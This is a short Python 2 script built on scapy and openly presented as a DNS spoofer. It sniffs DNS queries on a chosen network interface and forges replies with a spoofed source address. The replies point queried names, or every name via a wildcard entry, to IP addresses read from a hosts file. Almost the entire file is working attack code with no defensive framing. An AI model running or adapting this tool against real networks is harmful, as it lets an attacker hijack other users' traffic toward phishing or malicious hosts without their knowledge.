import scapy.all as scapy
import logging
import argparse

_iface = "eth0"
_filter = "udp port 53"
_file = None
dns_map = {}


def handle_packet(packet):
    ip = packet.getlayer(scapy.IP)
    udp = packet.getlayer(scapy.UDP)
    dns = packet.getlayer(scapy.DNS)
    # dhcp = packet.getlayer(scapy.DHCP)

    if dns.qr == 0 and dns.opcode == 0:
        queried_host = dns.qd.qname[:-1]
        resolved_ip = None

        if dns_map.get(queried_host):
            resolved_ip = dns_map.get(queried_host)
        elif dns_map.get('*'):
            resolved_ip = dns_map.get('*')

        if resolved_ip:
            dns_answer = scapy.DNSRR(rrname=queried_host + ".",
                                     ttl=330,
                                     type="A",
                                     rclass="IN",
                                     rdata=resolved_ip)

            dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
                        scapy.UDP(sport=udp.dport,
                                  dport=udp.sport) / \
                        scapy.DNS(
                            id=dns.id,
                            qr=1,
                            aa=0,
                            rcode=0,
                            qd=dns.qd,
                            an=dns_answer
                        )

            print "Send %s has %s to %s" % (queried_host,
                                            resolved_ip,
                                            ip.src)
            scapy.send(dns_reply, iface=_iface)


def parse_host_file(f):
    for line in open(f):
        line = line.rstrip('\n')

        if line:
            (ip, host) = line.split()
            dns_map[host] = ip


def main(args):
    global _file
    _file = args.hosts_file
    global _iface
    _iface = args.iface

    parse_host_file(_file)
    print "Spoofing DNS requests on %s" % _iface
    scapy.sniff(iface=_iface, filter=_filter, prn=handle_packet)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", dest="iface")
    parser.add_argument("-f", "--hosts_file", dest="hosts_file")
    return parser.parse_args()


if __name__ == "__main__":
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    main(parse_args())
